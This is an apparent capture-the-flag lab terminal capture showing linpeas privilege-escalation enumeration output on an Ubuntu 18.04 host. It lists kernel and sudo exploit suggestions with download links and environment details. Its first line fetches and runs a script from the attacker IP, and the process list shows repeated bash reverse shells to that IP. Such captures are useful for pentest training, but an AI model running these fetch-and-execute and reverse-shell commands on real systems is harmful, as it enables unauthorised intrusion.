theseus@ubuntu:~$ cat < /dev/tcp/10.10.14.82/80 | sh


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                                                                 
    |---------------------------------------------------------------------------------|                                                                                                 
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |                                                                                                 
    |         Follow on Twitter         :     @hacktricks_live                        |                                                                                                 
    |         Respect on HTB            :     SirBroccoli                             |                                                                                                 
    |---------------------------------------------------------------------------------|                                                                                                 
    |                                 Thank you!                                      |                                                                                                 
    \---------------------------------------------------------------------------------/                                                                                                 
          linpeas-ng by carlospolop                                                                                                                                                     
                                                                                                                                                                                        
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                      
                                                                                                                                                                                        
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                                                                
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                                                     
                               ╚═══════════════════╝                                                                                                                                    
OS: Linux version 5.3.0-42-generic (buildd@lcy01-amd64-019) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #34~18.04.1-Ubuntu SMP Fri Feb 28 13:42:26 UTC 2020
User & Groups: uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users)
Hostname: ubuntu
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)                     
                                                                                                                                                                                        
                                                                                                                                                                                        

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
                                                                                                                                                                                        
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                                                                                      
                              ╚════════════════════╝                                                                                                                                    
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                                                      
Linux version 5.3.0-42-generic (buildd@lcy01-amd64-019) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #34~18.04.1-Ubuntu SMP Fri Feb 28 13:42:26 UTC 2020                         
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.4 LTS
Release:        18.04
Codename:       bionic

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                                                         
Sudo version 1.8.21p2                                                                                                                                                                   

╔══════════╣ USBCreator
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation                                                         
                                                                                                                                                                                        
╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                                                                                 
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin                                                                                      

╔══════════╣ Date & uptime
Fri Feb 23 10:47:44 PST 2024                                                                                                                                                            
 10:47:44 up  2:38,  1 user,  load average: 0.56, 0.14, 0.05

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                                                                    
sda
sda1
sda2

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                                                                               
UUID=915d955c-619f-4b6e-be9f-85c0d954f3de /               ext4    errors=remount-ro 0       1                                                                                           
/dev/sda2                                 none            swap    sw              0       0
/dev/fd0        /media/floppy0  auto    rw,user,noauto,exec,utf8 0       0

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                                                                 
LESSOPEN=| /usr/bin/lesspipe %s                                                                                                                                                         
HISTFILESIZE=0
MAIL=/var/mail/theseus
USER=theseus
SSH_CLIENT=10.10.14.82 41062 22
SHLVL=3
HOME=/home/theseus
SSH_TTY=/dev/pts/3
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
LOGNAME=theseus
_=/bin/sh
XDG_SESSION_ID=40
TERM=xterm-256color
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
XDG_RUNTIME_DIR=/run/user/1000
LANG=en_US.UTF-8
HISTSIZE=0
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
PWD=/home/theseus
SSH_CONNECTION=10.10.14.82 41062 10.129.164.192 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed                                                                                  
dmesg Not Found                                                                                                                                                                         
                                                                                                                                                                                        
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                      
[+] [CVE-2021-4034] PwnKit                                                                                                                                                              

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                                                                                 
                                                                                                                                                                                        
╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                                                                           
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found                                                                                                                                
═╣ PaX bins present? .............. PaX Not Found                                                                                                                                       
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                                                
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                                                  
═╣ Seccomp enabled? ............... disabled                                                                                                                                            
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)                                                                                                                                        

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                                                                     
                                   ╚═══════════╝                                                                                                                                        
╔══════════╣ Container related tools present (if any):
╔══════════╣ Am I Containered?                                                                                                                                                          
╔══════════╣ Container details                                                                                                                                                          
═╣ Is this a container? ........... No                                                                                                                                                  
═╣ Any running containers? ........ No                                                                                                                                                  
                                                                                                                                                                                        

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                                                                                     
                                     ╚═══════╝                                                                                                                                          
═╣ GCP Virtual Machine? ................. No
═╣ GCP Cloud Funtion? ................... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ Aliyun ECS? .......................... No
grep: /etc/cloud/cloud.cfg: No such file or directory
═╣ Tencent CVM? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM? ............................ No
═╣ Azure APP? ........................... No



                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                                                      
                ╚════════════════════════════════════════════════╝                                                                                                                      
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                             
root         1  0.0  0.2 160008  9304 ?        Ss   08:08   0:01 /sbin/init auto noprompt                                                                                               
root       409  0.0  0.3 111452 12448 ?        S<s  08:08   0:00 /lib/systemd/systemd-journald
root       422  0.0  0.1  46672  4944 ?        Ss   08:08   0:00 /lib/systemd/systemd-udevd
root       525  0.0  0.0 232652   272 ?        Ssl  08:08   0:00 vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid
systemd+   601  0.0  0.0 146112  3264 ?        Ssl  08:08   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root       603  0.0  0.2  99424 10756 ?        Ss   08:08   0:00 /usr/bin/VGAuthService
root       606  0.0  0.1 244204  7956 ?        Ssl  08:08   0:08 /usr/bin/vmtoolsd
systemd+   811  0.0  0.1  70900  6172 ?        Ss   08:08   0:00 /lib/systemd/systemd-resolved
root       815  0.0  0.0  25992  3384 ?        Ss   08:08   0:00 /sbin/dhclient -1 -4 -v -pf /run/dhclient.ens160.pid -lf /var/lib/dhcp/dhclient.ens160.leases -I -df /var/lib/dhcp/dhclient6.ens160.leases ens160
root       915  0.0  0.0   4548   796 ?        Ss   08:08   0:00 /usr/sbin/acpid
avahi      930  0.0  0.0  47072   336 ?        S    08:08   0:00  _ avahi-daemon: chroot helper
root       923  0.0  0.2 434328  9552 ?        Ssl  08:08   0:00 /usr/sbin/ModemManager --filter-policy=strict
syslog     924  0.0  0.1 263032  4792 ?        Ssl  08:08   0:00 /usr/sbin/rsyslogd -n
root       925  0.0  0.3 517576 12384 ?        Ssl  08:08   0:00 /usr/lib/udisks2/udisksd
root       927  0.0  0.1  70704  6176 ?        Ss   08:08   0:00 /lib/systemd/systemd-logind
root       929  0.0  0.0  38424  3304 ?        Ss   08:08   0:00 /usr/sbin/cron -f
root       931  0.0  0.0 110544  2092 ?        Ssl  08:08   0:00 /usr/sbin/irqbalance --foreground
root       944  0.0  0.2 308548  8684 ?        Ssl  08:08   0:00 /usr/lib/accountsservice/accounts-daemon[0m
root       951  0.0  0.4 177640 17216 ?        Ssl  08:08   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
message+   952  0.0  0.1  51220  5560 ?        Ss   08:08   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root      1000  0.0  0.1  45232  5496 ?        Ss   08:08   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
root      1001  0.0  0.4 502324 17856 ?        Ssl  08:08   0:01 /usr/sbin/NetworkManager --no-daemon[0m
root      1002  0.0  0.7 868904 29924 ?        Ssl  08:08   0:01 /usr/lib/snapd/snapd
root      1014  0.0  0.2 311348 10960 ?        Ssl  08:08   0:00 /usr/lib/policykit-1/polkitd --no-debug
root      1098  0.0  0.1 308056  7620 ?        Ssl  08:08   0:00 /usr/sbin/gdm3
gdm       1263  0.0  0.1 197796  5560 tty1     Ssl+ 08:09   0:00      _ /usr/lib/gdm3/gdm-wayland-session gnome-session --autostart /usr/share/gdm/greeter/autostart
gdm       1276  0.0  0.3 714444 15184 tty1     Sl+  08:09   0:00          _ /usr/lib/gnome-session/gnome-session-binary --autostart /usr/share/gdm/greeter/autostart
gdm       1309  0.1  5.0 3408220 201912 tty1   Sl+  08:09   0:12              _ /usr/bin/gnome-shell
gdm       1353  0.0  0.9 366904 39348 tty1     Sl+  08:09   0:00              |   _ /usr/bin/Xwayland :1024 -rootless -terminate -accessx -core -listen 4 -listen 5 -displayfd 6
gdm       1381  0.0  0.2 448972  9536 tty1     Sl   08:09   0:00              |   _ ibus-daemon --xim --panel disable
gdm       1384  0.0  0.1 294488  7792 tty1     Sl   08:09   0:00              |       _ /usr/lib/ibus/ibus-dconf
gdm       1535  0.0  0.1 218764  7776 tty1     Sl   08:09   0:00              |       _ /usr/lib/ibus/ibus-engine-simple
gdm       1418  0.0  0.5 502556 23504 tty1     Sl+  08:09   0:00              _ /usr/lib/gnome-settings-daemon/gsd-xsettings
gdm       1421  0.0  0.2 294436  8152 tty1     Sl+  08:09   0:00              _ /usr/lib/gnome-settings-daemon/gsd-a11y-settings
gdm       1424  0.0  0.5 353828 21660 tty1     Sl+  08:09   0:00              _ /usr/lib/gnome-settings-daemon/gsd-clipboard
gdm       1429  0.0  0.5 666856 23460 tty1     Sl+  08:09   0:01              _ /usr/lib/gnome-settings-daemon/gsd-color
gdm       1430  0.0  0.3 394880 13608 tty1     Sl+  08:09   0:00              _ /usr/lib/gnome-settings-daemon/gsd-datetime
gdm       1431  0.0  0.1 283740  5212 tty1     Sl+  08:09   0:00              _ /usr/lib/gnome-settings-daemon/gsd-housekeeping
gdm       1432  0.0  0.5 514576 22888 tty1     Sl+  08:09   0:00              _ /usr/lib/gnome-settings-daemon/gsd-keyboard
gdm       1436  0.0  0.6 874716 24648 tty1     Sl+  08:09   0:00              _ /usr/lib/gnome-settings-daemon/gsd-media-keys
gdm       1442  0.0  0.1 201996  4600 tty1     Sl+  08:09   0:00              _ /usr/lib/gnome-settings-daemon/gsd-mouse
gdm       1446  0.0  0.5 525316 23844 tty1     Sl+  08:09   0:00              _ /usr/lib/gnome-settings-daemon/gsd-power
gdm       1448  0.0  0.2 267020  8564 tty1     Sl+  08:09   0:00              _ /usr/lib/gnome-settings-daemon/gsd-print-notifications
gdm       1451  0.0  0.1 202016  4640 tty1     Sl+  08:09   0:00              _ /usr/lib/gnome-settings-daemon/gsd-rfkill
gdm       1452  0.0  0.1 275732  4856 tty1     Sl+  08:09   0:00              _ /usr/lib/gnome-settings-daemon/gsd-screensaver-proxy
gdm       1458  0.0  0.2 321404 10124 tty1     Sl+  08:09   0:00              _ /usr/lib/gnome-settings-daemon/gsd-sharing
gdm       1462  0.0  0.2 464240  9916 tty1     Sl+  08:09   0:00              _ /usr/lib/gnome-settings-daemon/gsd-smartcard
gdm       1467  0.0  0.2 340896  9728 tty1     Sl+  08:09   0:00              _ /usr/lib/gnome-settings-daemon/gsd-sound
gdm       1470  0.0  0.5 438776 22980 tty1     Sl+  08:09   0:00              _ /usr/lib/gnome-settings-daemon/gsd-wacom
root      1102  0.0  0.1  72296  6388 ?        Ss   08:08   0:00 /usr/sbin/sshd -D
theseus   2550  0.0  0.1 110420  4692 ?        S    10:32   0:00      _ sshd: theseus@pts/3
theseus   2551  0.0  0.1  29492  4920 pts/3    Ss   10:32   0:00          _ -bash
root      2586  0.0  0.0  36144  2968 pts/3    S    10:36   0:00              _ /usr/bin/newgrp
theseus   2587  0.0  0.1  29536  4912 pts/3    S    10:36   0:00                  _ bash
theseus   2598  0.0  0.1  29664  5124 pts/3    S    10:38   0:00                      _ bash
theseus   2726  0.0  0.0  14712   736 pts/3    S+   10:47   0:00                          _ cat
theseus   2727  0.1  0.0   5788  3032 pts/3    S+   10:47   0:00                          _ sh
theseus   6003  0.0  0.0   5788  1380 pts/3    S+   10:47   0:00                              _ sh
theseus   6006  0.0  0.1  47180  4092 pts/3    R+   10:47   0:00                              |   _ ps fauxwww
theseus   6007  0.0  0.0   5788  1380 pts/3    S+   10:47   0:00                              _ sh
whoopsie  1125  0.0  0.3 542460 12992 ?        Ssl  08:08   0:00 /usr/bin/whoopsie -f
kernoops  1134  0.0  0.0  56940  2588 ?        Ss   08:08   0:00 /usr/sbin/kerneloops --test
kernoops  1142  0.0  0.0  56940  2596 ?        Ss   08:08   0:00 /usr/sbin/kerneloops
root      1171  0.0  0.5 264200 23080 ?        Ss   08:08   0:00 /usr/sbin/apache2 -k start
www-data  1809  0.0  0.3 269236 15544 ?        S    08:13   0:01  _ /usr/sbin/apache2 -k start
www-data  1810  0.0  0.3 269252 16076 ?        S    08:13   0:01  _ /usr/sbin/apache2 -k start
www-data  2416  0.0  0.0   4624   772 ?        S    10:27   0:00  |   _ sh -c bash -c 'bash -i >& /dev/tcp/10.10.14.82/9001 0>&1'
www-data  2417  0.0  0.0  18372  3040 ?        S    10:27   0:00  |       _ bash -c bash -i >& /dev/tcp/10.10.14.82/9001 0>&1
www-data  2418  0.0  0.0  18504  3384 ?        S    10:27   0:00  |           _ bash -i
www-data  2421  0.0  0.2  37292  9376 ?        S    10:27   0:00  |               _ python3 -c import pty;pty.spawn("/bin/bash")
www-data  2422  0.0  0.0  18504  3372 pts/2    Ss   10:27   0:00  |                   _ /bin/bash
root      2425  0.0  0.0  62168  3404 pts/2    S    10:28   0:00  |                       _ su - theseus
theseus   2438  0.0  0.1  29492  4892 pts/2    S+   10:28   0:00  |                           _ -su
www-data  1812  0.0  0.3 269112 15072 ?        S    08:13   0:01  _ /usr/sbin/apache2 -k start
www-data  1813  0.0  0.3 269252 15944 ?        S    08:13   0:01  _ /usr/sbin/apache2 -k start
www-data  1914  0.0  0.3 269208 15160 ?        S    08:21   0:01  _ /usr/sbin/apache2 -k start
www-data  1932  0.0  0.3 269260 15628 ?        S    08:30   0:01  _ /usr/sbin/apache2 -k start
www-data  1933  0.0  0.3 269128 15144 ?        S    08:30   0:01  _ /usr/sbin/apache2 -k start
www-data  1934  0.0  0.3 269268 15644 ?        S    08:30   0:01  _ /usr/sbin/apache2 -k start
www-data  1935  0.0  0.3 269268 15648 ?        S    08:30   0:01  _ /usr/sbin/apache2 -k start
www-data  2320  0.0  0.0   4624   880 ?        S    10:13   0:00  |   _ sh -c bash -c 'bash -i >& /dev/tcp/10.10.14.82/9001 0>&1'
www-data  2321  0.0  0.0  18372  3136 ?        S    10:13   0:00  |       _ bash -c bash -i >& /dev/tcp/10.10.14.82/9001 0>&1
www-data  2322  0.0  0.0  18504  3408 ?        S    10:13   0:00  |           _ bash -i
www-data  2325  0.0  0.2  37292  9480 ?        S    10:14   0:00  |               _ python3 -c import pty;pty.spawn("/bin/bash")
www-data  2326  0.0  0.0  18504  3476 pts/0    Ss   10:14   0:00  |                   _ /bin/bash
root      2393  0.0  0.0  62664  3740 pts/0    S+   10:24   0:00  |                       _ sudo sud admin
www-data  2204  0.0  0.3 269104 14240 ?        S    09:52   0:00  _ /usr/sbin/apache2 -k start
www-data  2403  0.0  0.0   4624   852 ?        S    10:25   0:00      _ sh -c bash -c 'bash -i >& /dev/tcp/10.10.14.82/9001 0>&1'
www-data  2404  0.0  0.0  18372  3028 ?        S    10:25   0:00          _ bash -c bash -i >& /dev/tcp/10.10.14.82/9001 0>&1
www-data  2405  0.0  0.0  18504  3428 ?        S    10:25   0:00              _ bash -i
www-data  2410  0.0  0.2  37292  9224 ?        S    10:26   0:00                  _ python3 -c import pty;pty.spawn("/bin/bash")
www-data  2411  0.0  0.0  18504  3472 pts/1    Ss   10:26   0:00                      _ /bin/bash
root      2415  0.0  0.0  62664  3892 pts/1    S+   10:27   0:00                          _ sudo -su theseus
mysql     1205  0.3  4.7 1555860 193276 ?      Sl   08:09   0:30 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
gdm       1238  0.0  0.1  76916  8060 ?        Ss   08:09   0:00 /lib/systemd/systemd --user
gdm       1239  0.0  0.0 196080  2716 ?        S    08:09   0:00  _ (sd-pam)
gdm       1265  0.0  0.1  50224  4740 ?        Ss   08:09   0:00  _ /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
gdm       1358  0.0  0.1 365552  7932 ?        Ssl  08:09   0:00  _ /usr/lib/at-spi2-core/at-spi-bus-launcher
gdm       1363  0.0  0.0  49924  3756 ?        S    08:09   0:00  |   _ /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 3
gdm       1365  0.0  0.1 220764  7072 ?        Sl   08:09   0:00  _ /usr/lib/at-spi2-core/at-spi2-registryd --use-gnome-session
gdm       1368  0.0  0.1 1072516 7852 ?        Ssl  08:09   0:00  _ /usr/bin/pulseaudio --daemonize=no
gdm       1389  0.0  0.1 292432  7860 ?        Sl   08:09   0:00  _ /usr/lib/ibus/ibus-portal
gdm       1402  0.0  0.1 271560  4960 ?        Ssl  08:09   0:00  _ /usr/libexec/xdg-permission-store
root      1339  0.0  0.2 322340  8724 ?        Ssl  08:09   0:00 /usr/lib/upower/upowerd
rtkit     1370  0.0  0.0 183504  3140 ?        SNsl 08:09   0:00 /usr/lib/rtkit/rtkit-daemon
  └─(Caps) 0x0000000000800004=cap_dac_read_search,cap_sys_nice
gdm       1387  0.0  1.2 638084 49544 tty1     Sl   08:09   0:00 /usr/lib/ibus/ibus-x11 --kill-daemon
root      1408  0.0  0.2 315244  8880 ?        Ssl  08:09   0:00 /usr/lib/x86_64-linux-gnu/boltd
root      1415  0.0  0.3 383596 14220 ?        Ssl  08:09   0:00 /usr/lib/packagekit/packagekitd
colord    1482  0.0  0.3 339580 15652 ?        Ssl  08:09   0:00 /usr/lib/colord/colord
root      1822  0.0  0.2 107700  8120 ?        Ss   08:13   0:00 /usr/sbin/cupsd -l
root      1823  0.0  0.2 303536 11064 ?        Ssl  08:13   0:00 /usr/sbin/cups-browsed
theseus   2426  0.0  0.1  76796  7908 ?        Ss   10:28   0:00 /lib/systemd/systemd --user
theseus   2427  0.0  0.0 196080  2720 ?        S    10:28   0:00  _ (sd-pam)

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                                                            
                                                                                                                                                                                        
╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user                                                                                                               
Proc 601 with ppid 1 is run by user systemd-timesync but the ppid user is root                                                                                                          
Proc 811 with ppid 1 is run by user systemd-resolve but the ppid user is root
Proc 917 with ppid 1 is run by user avahi but the ppid user is root
Proc 924 with ppid 1 is run by user syslog but the ppid user is root
